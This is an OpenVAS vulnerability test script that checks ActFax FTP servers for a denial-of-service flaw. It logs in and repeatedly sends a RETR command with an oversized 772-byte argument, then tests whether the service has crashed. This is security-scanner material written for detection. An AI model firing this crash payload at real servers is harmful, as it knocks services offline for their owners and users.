###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_actfax_ftp_retr_cmd_dos_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# ActFax FTP Server Post Auth 'RETR' Command Denial of Service Vulnerability
#
# Authors:
# Veerendra G.G <veernedragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900271");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-02-23 12:24:37 +0100 (Wed, 23 Feb 2011)");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_name("ActFax FTP Server Post Auth 'RETR' Command Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("FTP");
  script_dependencies("find_service_3digits.nasl");
  script_require_ports("Services/ftp", 21);

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16177/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/98540/actfax-overflow.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow the remote attackers to cause
  a denial of service.");
  script_tag(name:"affected", value:"ActiveFax Version 4.25 (Build 0221), Other versions may also
  be affected.");
  script_tag(name:"insight", value:"The flaw is due to an error while parsing RETR command, which
  can be exploited to crash the FTP service by sending big parameter to 'RETR'
  command.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running ActFax FTP Server and is prone to denial of
  service vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");

actFaxPort = get_kb_item("Services/ftp");
if(!actFaxPort){
  actFaxPort = 21;
}

if(!get_port_state(actFaxPort)){
  exit(0);
}

banner = get_ftp_banner(port:actFaxPort);
if("220 ActiveFax" >!< banner){
  exit(0);
}

user = get_kb_item("ftp/login");
if(!user){
  user = "unknown";
}

pass = get_kb_item("ftp/password");
if(!pass){
  pass = "";
}

flag = 0;

for(i=0; i<3 ; i++)
{
  soc1 = open_sock_tcp(actFaxPort);

  ## Exit if it's not able to open socket first time
  if(!soc1 && flag == 0){
    exit(0);
  }

  ftplogin = ftp_log_in(socket:soc1, user:user, pass:pass);

  ## Exit if it's not able to login first time
  if(!ftplogin && flag == 0){
    exit(0);
  }

  flag = 1;

  ## For the second time it's not able to open the socket or
  ## not able to login means server is crashed
  if (!ftplogin || !soc1)
  {
    security_message(actFaxPort);
    exit(0);
  }

  ## Send specially crafted RETR command
  send(socket:soc1, data:string("RETR ", crap(length: 772, data:"A"), '\r\n'));

  ftp_close(socket:soc1);
}

sleep(3);

## Server is crashed if not able to open the socket
## or not able to get the banner
soc2 = open_sock_tcp(actFaxPort);
if(!soc2)
{
  security_message(actFaxPort);
  exit(0);
}

resp = ftp_recv_line(socket:soc2);
if("220 ActiveFax" >!< resp)
{
  security_message(actFaxPort);
  exit(0);
}

ftp_close(socket:soc2);
